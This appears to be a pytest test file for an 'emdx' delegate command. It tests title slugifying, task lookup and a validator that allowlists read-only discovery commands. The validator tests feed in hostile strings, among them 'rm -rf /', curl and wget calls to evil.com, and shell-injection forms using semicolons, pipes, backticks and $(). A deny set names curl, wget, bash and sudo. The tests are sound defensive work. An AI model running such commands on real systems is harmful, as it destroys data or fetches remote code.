"""Tests for delegate command helper functions."""

import pytest
from unittest.mock import patch

from click.exceptions import Exit as ClickExit

from emdx.commands.delegate import (
    _slugify_title,
    _resolve_task,
    _validate_discovery_command,
    _run_discovery,
    PR_INSTRUCTION,
    SAFE_DISCOVERY_COMMANDS,
)


class TestSlugifyTitle:
    """Tests for _slugify_title — converts document titles to git branch slugs."""

    def test_simple_title(self):
        assert _slugify_title("Fix auth bug") == "fix-auth-bug"

    def test_strips_gameplan_prefix(self):
        assert _slugify_title("Gameplan #1: Contextual Save") == "contextual-save"

    def test_strips_feature_prefix(self):
        assert _slugify_title("Feature: Dark Mode Toggle") == "dark-mode-toggle"

    def test_strips_plan_prefix(self):
        assert _slugify_title("Plan #42: Refactor Database") == "refactor-database"

    def test_strips_doc_prefix(self):
        assert _slugify_title("Document: API Design") == "api-design"

    def test_removes_special_characters(self):
        assert _slugify_title("Smart Priming (context-aware)") == "smart-priming-context-aware"

    def test_collapses_whitespace(self):
        assert _slugify_title("fix   the   thing") == "fix-the-thing"

    def test_truncates_long_slugs(self):
        result = _slugify_title("A" * 100)
        assert len(result) <= 50

    def test_empty_after_strip_returns_feature(self):
        assert _slugify_title("Gameplan #1:") == "feature"

    def test_only_special_chars_returns_feature(self):
        assert _slugify_title("!!!???") == "feature"

    def test_no_trailing_hyphens(self):
        result = _slugify_title("test - ")
        assert not result.endswith("-")


class TestResolveTask:
    """Tests for _resolve_task — resolves doc IDs to content."""

    @patch("emdx.commands.delegate.get_document")
    def test_numeric_id_loads_doc(self, mock_get):
        mock_get.return_value = {
            "id": 42,
            "title": "Test Doc",
            "content": "Hello world",
        }
        result = _resolve_task("42")
        assert "Hello world" in result
        assert "Test Doc" in result
        mock_get.assert_called_once_with(42)

    @patch("emdx.commands.delegate.get_document")
    def test_numeric_id_with_pr_adds_instructions(self, mock_get):
        mock_get.return_value = {
            "id": 42,
            "title": "Fix Auth",
            "content": "Fix the authentication bug",
        }
        result = _resolve_task("42", pr=True)
        assert "Fix the authentication bug" in result
        assert "pull request" in result.lower() or "PR" in result

    def test_text_task_returned_as_is(self):
        result = _resolve_task("analyze the auth module")
        assert result == "analyze the auth module"

    @patch("emdx.commands.delegate.get_document")
    def test_missing_doc_falls_back(self, mock_get):
        mock_get.return_value = None
        result = _resolve_task("99999")
        # Should return the string as-is when doc not found
        assert "99999" in result


class TestPRInstruction:
    """Tests for PR instruction constant."""

    def test_pr_instruction_mentions_branch(self):
        assert "branch" in PR_INSTRUCTION.lower()

    def test_pr_instruction_mentions_pr_create(self):
        assert "gh pr create" in PR_INSTRUCTION


class TestValidateDiscoveryCommand:
    """Tests for _validate_discovery_command — security validation for --each commands.

    SECURITY: These tests verify that command injection attacks are prevented.
    The discovery command feature must ONLY allow safe, read-only commands.
    """

    # === ALLOWED COMMANDS (should pass) ===

    def test_fd_command_allowed(self):
        args, use_shell = _validate_discovery_command("fd -e py src/")
        assert args == ["fd", "-e", "py", "src/"]
        assert use_shell is False

    def test_find_command_allowed(self):
        args, _ = _validate_discovery_command("find . -name '*.py'")
        assert args[0] == "find"

    def test_git_ls_files_allowed(self):
        args, _ = _validate_discovery_command("git ls-files '*.py'")
        assert args[0] == "git"

    def test_rg_files_allowed(self):
        args, _ = _validate_discovery_command("rg --files src/")
        assert args[0] == "rg"

    def test_ls_allowed(self):
        args, _ = _validate_discovery_command("ls -la src/")
        assert args[0] == "ls"

    def test_eza_allowed(self):
        args, _ = _validate_discovery_command("eza --oneline")
        assert args[0] == "eza"

    def test_jq_allowed(self):
        args, _ = _validate_discovery_command("jq '.files[]' config.json")
        assert args[0] == "jq"

    def test_grep_allowed(self):
        args, _ = _validate_discovery_command("grep -l TODO src/")
        assert args[0] == "grep"

    def test_full_path_command_allowed(self):
        """Commands with full paths should work if base name is allowed."""
        args, _ = _validate_discovery_command("/usr/bin/fd -e py")
        assert args[0] == "/usr/bin/fd"

    def test_echo_allowed(self):
        """Echo is allowed for simple item generation."""
        args, _ = _validate_discovery_command("echo 'item1\nitem2'")
        assert args[0] == "echo"

    # === BLOCKED COMMANDS (should raise typer.Exit) ===

    def test_rm_blocked(self):
        """rm is NOT in the allowlist and should be blocked."""
        with pytest.raises(ClickExit):
            _validate_discovery_command("rm -rf /")

    def test_curl_blocked(self):
        """curl is NOT in the allowlist and should be blocked."""
        with pytest.raises(ClickExit):
            _validate_discovery_command("curl https://evil.com/script.sh")

    def test_wget_blocked(self):
        """wget is NOT in the allowlist and should be blocked."""
        with pytest.raises(ClickExit):
            _validate_discovery_command("wget https://evil.com/malware")

    def test_python_blocked(self):
        """python/python3 are NOT in the allowlist and should be blocked."""
        with pytest.raises(ClickExit):
            _validate_discovery_command("python -c 'import os; os.system(\"rm -rf /\")'")

    def test_bash_blocked(self):
        """bash is NOT in the allowlist and should be blocked."""
        with pytest.raises(ClickExit):
            _validate_discovery_command("bash -c 'rm -rf /'")

    def test_sh_blocked(self):
        """sh is NOT in the allowlist and should be blocked."""
        with pytest.raises(ClickExit):
            _validate_discovery_command("sh -c 'rm -rf /'")

    # === COMMAND INJECTION ATTEMPTS (should raise typer.Exit) ===

    def test_semicolon_injection_blocked(self):
        """Semicolon command chaining should be blocked."""
        with pytest.raises(ClickExit):
            _validate_discovery_command("fd -e py; rm -rf /")

    def test_ampersand_injection_blocked(self):
        """Ampersand command chaining should be blocked."""
        with pytest.raises(ClickExit):
            _validate_discovery_command("fd -e py && rm -rf /")

    def test_pipe_injection_blocked(self):
        """Pipe command chaining should be blocked."""
        with pytest.raises(ClickExit):
            _validate_discovery_command("fd -e py | xargs rm")

    def test_backtick_injection_blocked(self):
        """Backtick command substitution should be blocked."""
        with pytest.raises(ClickExit):
            _validate_discovery_command("fd `rm -rf /`")

    def test_dollar_paren_injection_blocked(self):
        """$(cmd) command substitution should be blocked."""
        with pytest.raises(ClickExit):
            _validate_discovery_command("fd $(rm -rf /)")

    def test_dollar_var_blocked(self):
        """$VAR expansion should be blocked to prevent env leakage."""
        with pytest.raises(ClickExit):
            _validate_discovery_command("echo $HOME")

    def test_redirect_to_absolute_path_blocked(self):
        """Redirecting to absolute paths should be blocked."""
        with pytest.raises(ClickExit):
            _validate_discovery_command("fd -e py > /etc/passwd")

    # === EDGE CASES ===

    def test_empty_command_blocked(self):
        """Empty commands should be blocked."""
        with pytest.raises(ClickExit):
            _validate_discovery_command("")

    def test_whitespace_only_command_blocked(self):
        """Whitespace-only commands should be blocked."""
        with pytest.raises(ClickExit):
            _validate_discovery_command("   ")

    def test_invalid_syntax_blocked(self):
        """Invalid shell syntax should be blocked."""
        with pytest.raises(ClickExit):
            _validate_discovery_command("fd 'unclosed quote")

    def test_quoted_args_preserved(self):
        """Quoted arguments should be properly parsed."""
        args, _ = _validate_discovery_command("find . -name '*.py'")
        assert "*.py" in args  # Quote stripped, glob preserved


class TestRunDiscovery:
    """Tests for _run_discovery — actually running discovery commands."""

    def test_successful_discovery_returns_lines(self):
        """A successful echo command should return lines."""
        # Use echo which is in the allowlist
        result = _run_discovery("echo 'line1\nline2\nline3'")
        assert len(result) == 3
        assert "line1" in result

    def test_injection_attempt_blocked_before_execution(self):
        """Command injection should be blocked before subprocess is called."""
        with pytest.raises(ClickExit):
            _run_discovery("echo test; rm -rf /")

    def test_dangerous_command_blocked_before_execution(self):
        """Non-allowlisted commands should be blocked before subprocess."""
        with pytest.raises(ClickExit):
            _run_discovery("curl https://evil.com")


class TestSafeDiscoveryCommands:
    """Tests for the SAFE_DISCOVERY_COMMANDS allowlist."""

    def test_allowlist_contains_common_tools(self):
        """Verify common discovery tools are in the allowlist."""
        expected = {"fd", "find", "git", "rg", "ls", "grep", "jq"}
        assert expected.issubset(SAFE_DISCOVERY_COMMANDS)

    def test_allowlist_excludes_dangerous_tools(self):
        """Verify dangerous tools are NOT in the allowlist."""
        dangerous = {"rm", "mv", "cp", "curl", "wget", "python", "bash", "sh", "sudo"}
        assert not dangerous.intersection(SAFE_DISCOVERY_COMMANDS)
